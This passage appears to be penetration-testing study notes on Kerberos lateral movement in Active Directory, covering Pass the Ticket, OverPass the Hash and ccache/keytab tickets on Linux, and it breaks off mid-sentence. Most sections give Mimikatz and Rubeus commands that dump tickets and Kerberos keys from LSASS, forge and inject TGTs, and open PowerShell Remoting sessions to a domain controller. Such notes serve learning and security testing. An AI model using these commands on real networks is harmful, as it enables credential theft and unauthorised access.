Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/).

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
# Harvesting Kerberos Tickets from Windows
On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.

As user we can only get our _tickets_, but as local admin we can collect everything.
## Mimikatz
We can use _sekurlsa::tickets /export_ module from #mimikatz.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

dir *.kirbi # The result list of files with the extension `.kirbi`, which contain the tickets.
``` 

> [!NOTE] Different ticket
> _$_ -> correspond to the computer account (cmd-session 0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi)
_@_ -> correspond to user account ([randomvalue]-username@service-domain.local.kirbi)

**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
## Robeus
We can perform the same things with #robeus.
```cmd
Rubeus.exe dump /nowrap
```

# Pass the Key or OverPass the Hash
The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.

For more read [Robeus docs](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

**DUMP User's HASH**
To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
## Mimikatz
```cmd
mimikatz.exe
mimikatz # privilege::debug
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
## Robeus
To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<HASH> /nowrap
```

We could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

---
# Pass The Ticket (PtT)
First in first we must  have some Kerberos tickets.
## Robeus
With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

**Craft and Import**
```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /ptt
```

**Import from .kirbi file**
We can use a tickets exported from #mimikatz and import it.
```cmd
Rubeus.exe ptt /ticket:<KIRBI FILE>
```

**Import BASE64 Tickets**
Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

_First convert a kirbi file_
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<KRIBI FILE>"))
```

Convert or use base64 output tickets from robeus.
```cmd
Rubeus.exe ptt /ticket:<BASE64 TICKET>
```
## PowerShell Remoting
Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```


The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.
```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes265:<HASH> /ptt
powershell
Enter-PSSession -ComputerName DC01
```

## Mimikatz 
Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.
```cmd
mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "<FULL PATH to KIRBI FILE>"
```

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
## PowerShell Remoting
To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute mimikatz.exe, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command `Enter-PSSession` to connect to the target machine.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "<FULL PATH to KIRBI FILE>"
mimikatz # exit
powershell
Enter-PSSession -ComputerName DC01
```

# Linux Domain joined machine
In active directory context a sys admin can manage Linux Machine with a directory to provide centralized identity management and integrate with the organization's systems.

A Linux computer connected to Active Directory commonly uses #KERBEROS  as authentication.
## Kerberos on Linux
By default, the location of the stored Kerberos ticket is saved in the environment variable **KRB5CCNAME**, the position in a file system by default is _/tmp_.

These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, so we have to take some high privileges.

**KEYTAB**
Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

This kind of ticket can craft in any domain join machine and shifted between them.
## Identifying Linux and AD Integration
We can use tool like  [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) for know i
